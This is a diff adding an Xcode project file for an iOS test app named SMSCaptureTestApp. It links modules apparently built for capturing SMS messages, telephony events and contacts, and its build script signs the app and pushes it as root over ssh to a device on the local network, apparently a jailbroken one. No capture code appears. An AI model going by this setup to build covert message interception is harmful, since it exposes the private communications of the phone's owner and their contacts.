+			remoteRef = EDCE034A1485CE7B004D4053 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+/* End PBXReferenceProxy section */
+
+/* Begin PBXResourcesBuildPhase section */
+		1D60588D0D05DD3D006BFB54 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		35F8B11416C4A3640039DD3A /* ShellScript */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# Sign code with iOS Developer certificate\n# Xcode 6 downward\n#export CODESIGN_ALLOCATE=${SDK_ROOT}/Platforms/iPhoneOS.platform/Developer/usr/bin/codesign_allocate\n# Xcode 7 upward\nexport CODESIGN_ALLOCATE=${SDK_ROOT}/Toolchains/XcodeDefault.xctoolchain/usr/bin/codesign_allocate\nif [ \"${PLATFORM_NAME}\" == \"iphoneos\" ]; then\n    ../../OTC/Entitlements/gen_entitlements.py \"com.yourcompany.${PRODUCT_NAME}\" \"${BUILT_PRODUCTS_DIR}/${WRAPPER_NAME}/${PRODUCT_NAME}.xcent\";\n    codesign -f -s \"iOS Developer\" --entitlements \"${BUILT_PRODUCTS_DIR}/${WRAPPER_NAME}/${PRODUCT_NAME}.xcent\" \"${BUILT_PRODUCTS_DIR}/${WRAPPER_NAME}/\"\nfi\n\n\n####################################################################################################################################################################\nDEVICE_IP=192.168.3.200\nssh root@${DEVICE_IP} rm -rf /Applications/${WRAPPER_NAME}\nscp -r ${BUILT_PRODUCTS_DIR}/${WRAPPER_NAME} root@${DEVICE_IP}:/Applications/";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		1D60588E0D05DD3D006BFB54 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1D60589B0D05DD56006BFB54 /* main.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		35F8B12B16C4A4E50039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxEvents;
+			targetProxy = 35F8B12A16C4A4E50039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B12D16C4A4EA0039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxStd;
+			targetProxy = 35F8B12C16C4A4EA0039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B12F16C4A4ED0039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = ABContactsManager;
+			targetProxy = 35F8B12E16C4A4ED0039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B13116C4A4F00039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FMDB;
+			targetProxy = 35F8B13016C4A4F00039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B13316C4A4F30039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = EventCenter;
+			targetProxy = 35F8B13216C4A4F30039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B13516C4A4F60039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = TelephonyNotification;
+			targetProxy = 35F8B13416C4A4F60039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B13716C4A4F80039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = SMSCaptureManager;
+			targetProxy = 35F8B13616C4A4F80039DD3A /* PBXContainerItemProxy */;
+		};
+		35F8B20616C4A5490039DD3A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = IPC;
+			targetProxy = 35F8B20516C4A5490039DD3A /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		1D6058940D05DD3E006BFB54 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Don't Code Sign";
+				COPY_PHASE_STRIP = NO;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3\"",
+				);
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = SMSCaptureTestApp_Prefix.pch;
+				INFOPLIST_FILE = "SMSCaptureTestApp-Info.plist";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS5/ChatKit\"",
+				);
+				PRODUCT_NAME = SMSCaptureTestApp;
+				SDKROOT = iphoneos;
+				USER_HEADER_SEARCH_PATHS = "../../PhoneInfo/Source-PhoneInfo ../../AppContext/Source-AppContext ../../IPC/Source-IPC ../../EventCenter/Source-EventCenter ../../SMSCaptureManager/Source-SMSCaptureManager ../../TelephonyNotification/Source-TelePhonyNotification ../../Std/FxStd ../../Std/FxStd/AddressBookHelper ../../ccgus-fmdb-606b29d/src";
+			};
+			name = Debug;
+		};
+		1D6058950D05DD3E006BFB54 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "Don't Code Sign";
+				COPY_PHASE_STRIP = YES;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3\"",
+				);
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = SMSCaptureTestApp_Prefix.pch;
+				INFOPLIST_FILE = "SMSCaptureTestApp-Info.plist";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS5/ChatKit\"",
+				);
+				PRODUCT_NAME = SMSCaptureTestApp;
+				SDKROOT = iphoneos;
+				USER_HEADER_SEARCH_PATHS = "../../PhoneInfo/Source-PhoneInfo ../../AppContext/Source-AppContext ../../IPC/Source-IPC ../../EventCenter/Source-EventCenter ../../SMSCaptureManager/Source-SMSCaptureManager ../../TelephonyNotification/Source-TelePhonyNotification ../../Std/FxStd ../../Std/FxStd/AddressBookHelper ../../ccgus-fmdb-606b29d/src";
+			};
+			name = Release;
+		};
+		C01FCF4F08A954540054247B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				PREBINDING = NO;
+				SDKROOT = iphoneos4.0;
+			};
+			name = Debug;
+		};
+		C01FCF5008A954540054247B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				PREBINDING = NO;
+				SDKROOT = iphoneos4.0;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		1D6058960D05DD3E006BFB54 /* Build configuration list for PBXNativeTarget "SMSCaptureTestApp" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1D6058940D05DD3E006BFB54 /* Debug */,
+				1D6058950D05DD3E006BFB54 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C01FCF4E08A954540054247B /* Build configuration list for PBXProject "SMSCaptureTestApp" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C01FCF4F08A954540054247B /* Debug */,
+				C01FCF5008A954540054247B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 29B97313FDCFA39411CA2CEA /* Project object */;
+}
